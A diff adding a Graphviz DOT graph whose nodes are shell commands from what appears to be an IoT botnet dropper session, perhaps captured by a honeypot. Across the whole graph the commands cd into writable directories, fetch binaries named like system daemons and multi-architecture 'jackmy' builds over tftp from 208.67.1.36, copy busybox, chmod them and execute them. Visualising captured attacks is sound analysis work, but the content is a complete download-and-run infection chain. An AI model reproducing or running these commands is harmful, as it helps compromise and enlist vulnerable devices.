@@ -1,0 +1,366 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 14 [label="||,"];
+14 [label="tftp 208.67.1.36 -c get ntpd "];
+14 -> 16 [label=";,"];
+16 [label="cat ntpd badbox "];
+16 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 34 [label="||,"];
+34 [label="tftp 208.67.1.36 -c get sshd "];
+34 -> 36 [label=";,"];
+36 [label="cat sshd badbox "];
+36 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 54 [label="||,"];
+54 [label="tftp 208.67.1.36 -c get openssh "];
+54 -> 56 [label=";,"];
+56 [label="cat openssh badbox "];
+56 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 74 [label="||,"];
+74 [label="tftp 208.67.1.36 -c get bash "];
+74 -> 76 [label=";,"];
+76 [label="cat bash badbox "];
+76 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 94 [label="||,"];
+94 [label="tftp 208.67.1.36 -c get tftp "];
+94 -> 96 [label=";,"];
+96 [label="cat tftp badbox "];
+96 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 114 [label="||,"];
+114 [label="tftp 208.67.1.36 -c get wget "];
+114 -> 116 [label=";,"];
+116 [label="cat wget badbox "];
+116 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 134 [label="||,"];
+134 [label="tftp 208.67.1.36 -c get cron "];
+134 -> 136 [label=";,"];
+136 [label="cat cron badbox "];
+136 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 154 [label="||,"];
+154 [label="tftp 208.67.1.36 -c get ftp "];
+154 -> 156 [label=";,"];
+156 [label="cat ftp badbox "];
+156 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 174 [label="||,"];
+174 [label="tftp 208.67.1.36 -c get pftp "];
+174 -> 176 [label=";,"];
+176 [label="cat pftp badbox "];
+176 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 194 [label="||,"];
+194 [label="tftp 208.67.1.36 -c get sh "];
+194 -> 196 [label=";,"];
+196 [label="cat sh badbox "];
+196 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 214 [label="||,"];
+214 [label="tftp 208.67.1.36 -c get   "];
+214 -> 216 [label=";,"];
+216 [label="cat   badbox "];
+216 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 234 [label="||,"];
+234 [label="tftp 208.67.1.36 -c get apache2 "];
+234 -> 236 [label=";,"];
+236 [label="cat apache2 badbox "];
+236 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 254 [label="||,"];
+254 [label="tftp 208.67.1.36 -c get telnetd "];
+254 -> 256 [label=";,"];
+256 [label="cat telnetd badbox "];
+256 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 264 [label=";,"];
+264 [label="cp /bin/busybox -O /tmp/badbox "];
+264 -> 264
+266 [label="tftp 208.67.1.36 -c get jackmymipsel "];
+266 -> 266
+268 [label="cat jackmymipsel badbox "];
+268 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 276 [label=";,"];
+276 [label="tftp 208.67.1.36 -c get jackmymips "];
+276 -> 276
+278 [label="cat jackmymips badbox "];
+278 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 286 [label=";,"];
+286 [label="tftp 208.67.1.36 -c get jackmysh4 "];
+286 -> 286
+288 [label="cat jackmysh4 badbox "];
+288 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 296 [label=";,"];
+296 [label="tftp 208.67.1.36 -c get jackmyx86 "];
+296 -> 296
+298 [label="cat jackmyx86 badbox "];
+298 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 306 [label=";,"];
+306 [label="tftp 208.67.1.36 -c get jackmyarmv6 "];
+306 -> 306
+308 [label="cat jackmyarmv6 badbox "];
+308 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 316 [label=";,"];
+316 [label="tftp 208.67.1.36 -c get jackmyi686 "];
+316 -> 316
+318 [label="cat jackmyi686 badbox "];
+318 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 326 [label=";,"];
+326 [label="tftp 208.67.1.36 -c get jackmypowerpc "];
+326 -> 326
+328 [label="cat jackmypowerpc badbox "];
+328 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 336 [label=";,"];
+336 [label="tftp 208.67.1.36 -c get jackmyi586 "];
+336 -> 336
+338 [label="cat jackmyi586 badbox "];
+338 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 346 [label=";,"];
+346 [label="tftp 208.67.1.36 -c get jackmym86k "];
+346 -> 346
+348 [label="cat jackmym86k badbox "];
+348 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+363 [label="./badbox "];
+363 -> 356 [label=";,"];
+356 [label="tftp 208.67.1.36 -c get jackmysparc "];
+356 -> 356
+358 [label="cat jackmysparc badbox "];
+358 -> 360 [label=";,"];
+360 [label="badbox "];
+360 -> 360
+362 [label="chmod +x * "];
+362 -> 363 [label=";,"];
+}
